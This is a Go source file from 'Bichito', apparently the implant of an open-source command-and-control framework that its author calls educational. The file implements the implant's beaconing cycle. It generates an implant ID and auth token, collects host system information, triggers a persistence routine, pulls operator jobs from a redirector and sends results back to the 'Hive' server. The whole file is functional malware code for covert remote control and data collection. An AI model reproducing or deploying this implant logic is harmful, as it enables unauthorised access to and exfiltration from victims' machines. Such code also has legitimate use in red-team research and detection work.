//{{{{{{{ Bichito High-Level Communications with Redirector }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (
	"strings"
	"encoding/json"
	"bichito/modules/network"
	"bichito/modules/biterpreter"
	"bichito/modules/persistence"
	"fmt"
	"bytes"
	"time"
)

/*
Description: Implant Routine to connect to try a connection cycle with selected redirector
Flow:
A.Check if BID is present in memory, if not, generate one and build the first athentication header.Finish till next cycle.
B.Check if sysinfo has been retrieved, if not:
	B1.Execute target OS/Arch sysinfo module
	B2.Wrappe a Job with retrieved sysinfo and add it to the on memory slice for Jobs to Hive
C.Check if persistence modules are active,if so:
	C1.Use target persistence module to check if Persistence is already present on the disk
	C2.If not,wrap a Job to Hive with persistence state processing, this will trigge at Hive a persistence routine
		to send back a binary to persist.
D.Retrieve Jobs routine:
	D1.Start a go routine to try to connect to redirector using selected network module,till timeout
	D2.If any Jobs retrieved, send them to the on memory slice to be processed by the JobProcessor (./src/bichito/biJobs.go)
E.Send Jobs routine:
	E1.Start a go routine to try to connect to redirector using selected network module,till timeout
	E2.Independently of succes of failure, flush the Jobs to Hive to avoid implants coms blockage
*/
func connectOut() string{
	
	var newJobs []*Job
	var encodedJobs []byte
	var error string
		
	//Check if BID is present, if not generate a new one for this implant,and return, this will generate a "Ping" within job processor to be sent to Hive
	if !strings.Contains(bid,"B-"){

		bid = fmt.Sprintf("%s%s","B-",randomString(8))
	
		//Prepare Authentication with Bid for next Connections
		biauth := BiAuth{bid,biconfig.Token}
		bufRP := new(bytes.Buffer)
		json.NewEncoder(bufRP).Encode(biauth)
		resultRP := bufRP.String()
		authbearer = resultRP
		authbearer = strings.TrimSuffix(authbearer, "\n")

		return "Success"
	}
	
	//Check if sysinfo was retrieved and sent to Hive correctly
	if sysinfo != true {
		
		errorS,info := biterpreter.Sysinfo()
		if errorS{
			info = "Error Getting System Info:"+info
			go addLog("Error Getting System Info:"+info)
			return info
		}

		jobsysinfo := &Job{"","","",bid,"sysinfo","","Success",info,""}


		jobsToHive.mux.Lock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
		jobsToHive.mux.Unlock()

		sysinfo = true
	}

	//If persistence is active for this implant,check if its present in the foothold, and trigger or not a persistence flow
	if !persisted{
		
		errorP1,alreadyP := persistence.CheckPersistence(biconfig.Persistence)
		if errorP1{
			addLog("Check Persistence error:"+alreadyP)
		}

		if (alreadyP != "Persisted"){

			jobsysinfo := &Job{"","","",bid,"persistence","","Processing","",""}

			jobsToHive.mux.Lock()
			jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
			jobsToHive.mux.Unlock()

		}else{
			persisted = true
		}
	}

	//Job retrieval routine
	//5 sec Timeout to perform Job retrieve
	var retrieveError string
	retrieveTimeout := time.NewTimer(time.Duration(30) * time.Second)
	retrieveErr := make(chan string, 1)
	retrieveCont := make(chan string, 1)

	go func(){
	
		//Get Any Jobs from Bots targeting this redirector
		encodedJobs,error = network.RetrieveJobs(redirectors[0],authbearer)
		if error != "Success"{
			retrieveError = error
			retrieveErr <- "error"
		}

		retrieveCont <- "continue"

	}()
	select{
		case <- retrieveCont:
		case <- retrieveErr:
			return retrieveError			
		case <- retrieveTimeout.C:
			return "Retrieve Jobs from Redirector Timeout"		
	}


	errD := json.Unmarshal(encodedJobs,&newJobs)
	if errD != nil{
		return "Error Decoding Jobs from Hive"+errD.Error()
	}

	//Lock shared Slice
	jobsToProcess.mux.Lock()
	jobsToProcess.Jobs = append(jobsToProcess.Jobs,newJobs...)
	jobsToProcess.mux.Unlock()
	
	//Job send routine
	//Encode Jobs
	bufRC := new(bytes.Buffer)
	json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
	jobsToHi := bufRC.String()

	//5 sec Timeout to perform Job Sending
	var sendError string
	sendTimeout := time.NewTimer(time.Duration(30) * time.Second)
	sendErr := make(chan string, 1)
	sendCont := make(chan string, 1)

	go func(){
		error = network.SendJobs(redirectors[0],authbearer,[]byte(jobsToHi))
		if error != "Success"{
			sendError = error
			sendErr <- "error"
		}

		sendCont <- "continue"
	}()
	select{
		case <- sendCont:
		case <- sendErr:
			//Flush Jobs to avoid Bichito getting stuck in following beaconings
			jobsToHive.mux.Lock()
			jobsToHive.Jobs = jobsToHive.Jobs[:0]
			jobsToHive.mux.Unlock()
			return retrieveError			
		case <- sendTimeout.C:
			//Flush Jobs to avoid Bichito getting stuck in following beaconings
			jobsToHive.mux.Lock()
			jobsToHive.Jobs = jobsToHive.Jobs[:0]
			jobsToHive.mux.Unlock() 
			return "Send Jobs to Redirector Timeout"		
	}

	jobsToHive.mux.Lock()
	jobsToHive.Jobs = jobsToHive.Jobs[:0]
	jobsToHive.mux.Unlock()

	return "Success"
}